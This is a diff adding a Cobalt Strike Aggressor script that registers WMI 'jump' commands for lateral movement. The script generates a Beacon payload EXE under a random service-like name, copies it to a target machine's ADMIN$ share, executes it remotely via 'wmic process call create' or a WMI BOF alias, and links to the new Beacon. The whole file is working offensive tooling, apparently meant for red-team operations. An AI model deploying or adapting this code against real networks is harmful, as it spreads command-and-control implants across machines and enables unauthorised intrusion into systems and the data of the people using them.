@@ -1,0 +1,69 @@
+# Author: @fastlorenzo
+# Jumps to another machine by dropping a beacon EXE to ADMIN$ share and running it via WMI
+# Requires https://github.com/trustedsec/CS-Situational-Awareness-BOF to use the bofwmi jump
+
+# $1 = bid, $2 = target, $3 = listener
+sub wmi_remote_spawn {
+	local('$name $exedata');
+
+	btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3) . ") via WMI", "T1047");
+
+	# we need a random file name.
+	$name = rand(@("run", "svc", "win")) . rand(100) . ".exe";
+
+	# generate an EXE. $arch defined via &lambda when this function was registered with
+	# beacon_remote_exploit_register
+	$exedata = artifact_payload($3, "exe", $arch);
+
+	# upload the EXE to our target (directly)
+	bupload_raw!($1, "\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name", $exedata);
+
+  	blog($1, "wmic /node:\" $+ $2 $+ \" process call create \"\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name $+ \"");
+
+	# execute this via WMI
+	brun!($1, "wmic /node:\" $+ $2 $+ \" process call create \"\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name $+ \"");
+
+	# assume control of our payload (if it's an SMB or TCP Beacon)
+	beacon_link($1, $2, $3);
+}
+
+
+# $1 = bid, $2 = target, $3 = listener
+sub wmi_remote_spawn_bof {
+	local('$name $exedata $file_path $query $call');
+
+	btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3) . ") via WMI (using BOF)", "T1047");
+
+	# we need a random file name.
+	$name = rand(@("run", "svc", "win")) . rand(100) . ".exe";
+
+	# generate an EXE. $arch defined via &lambda when this function was registered with
+	# beacon_remote_exploit_register
+	$exedata = artifact_payload($3, "exe", $arch);
+
+	#$file_path = "\\$2\ADMIN\$\\$name";
+	$file_path = "\\\\$2\\ADMIN\$\\$name";
+
+	# upload the EXE to our target (directly)
+	bupload_raw!($1, $file_path, $exedata);
+
+	# build the wmi query to be run
+	$query = "process call create $file_path";
+
+	# create the arguments call to wmi_query alias
+	$call = "\"$query\" \"$2\"";
+
+	blog($1, "wmi_query $call");
+
+	# execute this via WMI using the wmi_query BOF alias
+	fireAlias($1, "wmi_query", $call);
+
+	# assume control of our payload (if it's an SMB or TCP Beacon)
+	beacon_link($1, $2, $3);
+}
+
+beacon_remote_exploit_register("wmi", "x86", "Use WMI to run a Beacon payload", lambda(&wmi_remote_spawn, $arch => "x86"));
+beacon_remote_exploit_register("wmi64", "x64", "Use WMI to run a Beacon payload", lambda(&wmi_remote_spawn, $arch => "x64"));
+
+beacon_remote_exploit_register("bofwmi", "x86", "Use WMI (BOF) to run a Beacon payload", lambda(&wmi_remote_spawn_bof, $arch => "x86"));
+beacon_remote_exploit_register("bofwmi64", "x64", "Use WMI (BOF) to run a Beacon payload", lambda(&wmi_remote_spawn_bof, $arch => "x64"));
